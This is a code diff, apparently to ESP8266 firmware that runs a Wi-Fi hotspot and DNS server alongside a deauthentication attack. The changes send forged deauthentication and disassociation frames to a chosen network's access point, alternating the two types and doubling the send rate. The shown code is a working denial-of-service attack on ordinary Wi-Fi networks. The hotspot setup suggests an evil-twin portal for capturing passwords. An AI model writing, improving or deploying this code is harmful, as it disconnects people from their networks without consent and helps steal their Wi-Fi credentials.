@@ -110,6 +110,7 @@ void performScan() {
 
 bool hotspot_active = false;
 bool deauthing_active = false;
+bool deauth_disass = true;
 
 void handleResult() {
   String html = "";
@@ -375,7 +376,7 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (deauthing_active && millis() - deauth_now >= 1000) {
+  if (deauthing_active && millis() - deauth_now >= 500) {
 
     wifi_set_channel(_selectedNetwork.ch);
     /*Serial.println(_selectedNetwork.ch);
@@ -388,24 +389,29 @@ void loop() {
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
     deauthPacket[24] = 1;
 
-    // Deauthentication (are not sent as fast as planned... why?)
-    deauthPacket[0] = 0xC0;
-    Serial.println(bytesToStr(deauthPacket, 26));
-    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-    // Disassocation (seems never sent, even if I add a delay...)
-    deauthPacket[0] = 0xA0;
-    Serial.println(bytesToStr(deauthPacket, 26));
-    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    if (deauth_disass) {
+      // Deauthentication
+      deauthPacket[0] = 0xC0;
+      Serial.println(bytesToStr(deauthPacket, 26));
+      Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    } else {
+      // Disassocation
+      deauthPacket[0] = 0xA0;
+      Serial.println(bytesToStr(deauthPacket, 26));
+      Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    }
+    deauth_disass = !deauth_disass;
 
     deauth_now = millis();
   }
 
   if (millis() - now >= 15000) {
+    Serial.println("Scanning wifi");
     performScan();
     now = millis();
   }
 
-  if (millis() - wifinow >= 2000) {
+  if (millis() - wifinow >= 10000) {
     if (WiFi.status() != WL_CONNECTED) {
       Serial.println("BAD");
     } else {
